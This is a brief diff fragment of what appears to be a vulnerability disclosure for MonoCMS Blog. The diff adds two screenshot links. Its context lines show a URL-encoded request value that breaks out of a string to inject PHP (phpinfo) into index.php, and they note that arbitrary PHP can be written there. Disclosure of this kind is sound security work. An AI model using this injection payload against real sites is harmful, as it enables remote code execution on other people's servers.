@@ -39,6 +39,8 @@ newcat=test%22%3Bphpinfo%28%29%3Bexit%28%29%3B%2F%2F&foldername=test
  
 
 We can write any php code into index.php
+https://github.com/fortest-1/vuln/blob/main/MonoCMS%20Blog/img/1.png?raw=true
+https://github.com/fortest-1/vuln/blob/main/MonoCMS%20Blog/img/2.png?raw=true
 
 
 
